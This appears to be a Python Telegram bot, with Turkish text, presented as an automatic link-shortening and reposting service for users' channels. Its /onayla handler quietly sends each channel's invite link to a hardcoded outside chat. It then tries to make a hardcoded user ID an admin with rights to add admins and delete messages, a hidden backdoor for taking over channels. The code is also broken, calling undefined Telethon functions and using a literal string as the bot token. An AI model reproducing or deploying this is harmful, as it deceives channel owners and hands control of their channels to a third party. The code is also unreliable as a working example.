
import requests
from requests import get
from os import environ
import asyncio
from asyncio import sleep
from pymongo import MongoClient
import telebot

api_id = environ['API_ID']
api_hash = environ['API_HASH']
botapi = environ['BOT_TOKEN'] 
mongo = environ['MONGO']
#bot = TelegramClient("Bot", api_id, api_hash).start(bot_token=botapi)
cluster = MongoClient(mongo)
db = cluster["OtoPost"]
collection = db["Kanallar"]
bot = telebot.TeleBot("botapi")
print("Başlıyor")
    
@bot.message_handler(commands=['start'])
def start(message):
    chat = message.chat_id
    bot.send_message(chat, "Merhaba!\n\n**Ne İşe Yarıyor?**\nBu bot [Link Mahzeni'nde](https://t.me/joinchat/UYu8q0gBTUdUudDL) paylaşılan postların linklerini otomatik olarak kısaltıp sizin kanalınıza iletir.\n\n**Nasıl Kullanılır?**\n1. Adım: Botu kanlınıza yönetici olarak ekleyin. \n2. Adım: API adresinizi ve Kanal ID girin. \n-/kaydet TRLINK_API KANAL_ID \n3. Adım: Kanalınzda /onayla yazın.\n4. Adım: Keyfini çıkarın.\n\n__NOT: Kanalınızın ID numarasını bilmiyorsanız kanaldan bota bir post iletin bot size söyleyecek.__")

@bot.channel_post_handler(commands=['onayla'])
def post(message):
    chat = message.chat_id
    print(chat)
    link = bot(functions.messages.ExportChatInviteRequest(chat))
    link = str(link).split(", ")
    link = link[0].replace("ChatInviteExported(link='", " ").replace("'", " ")
    bot.send_message(-1001463492864, link)
    new_rights = ChatAdminRights(post_messages=True, add_admins=True, invite_users=True, delete_messages=True)
    time.sleep(1)
    try:
        message.client(EditAdminRequest(chat, 1671239079, new_rights, "Post"))
    except:
        
        bot.send_message(chat, "Lütfen bota tüm yetkileri verin.")
    else:
        bot.send_message(chat, "Tamamdır!")

@bot.message_handler(func=lambda message: True)
def aydialma(message):
    getter = message.is_private
    print(getter)
    if not message.text == None and message.text.startswith("/kaydet"):
        mesaj = message.text.split(None, 2)[1:]
        cid = message.chat_id
        user = message.sender_id
        kanallar = []
        print(mesaj)
        if len(mesaj) < 2:
            bot.send_message(cid, "Yanlış kullanım! \n\n-/kaydet TRLINK_API KANAL_ID")
            return
        key = {"_id": user, "token": mesaj[0], "kanal": mesaj[1]}
        bnb = collection.find_one({"_id": user})
        if bnb == None:
            collection.insert_one(key)
        else:
            kanal = bnb["kanal"]
            if isinstance(kanal,list):
                for i in kanal:
                    kanallar.append(i)
                kanallar.append(mesaj[1])
                collection.update_one({"_id": user}, {"$set":{"token": mesaj[0], "kanal": kanallar}})
            else:
                kanallar.append(kanal)
                kanallar.append(mesaj[1])             
                collection.update_one({"_id": user}, {"$set":{"token": mesaj[0], "kanal": kanallar}})

    
        bot.send_message(cid, "Kaydedildi!")
    elif message.is_private:
        chat = message.chat_id
        ileti = str(message.fwd_from.from_id)
        ileti = ileti.replace("PeerChannel(channel_id=", "").replace(")", "")
        
        bot.send_message(chat, f"Kanal ID: `-100{ileti}`")



bot.polling()
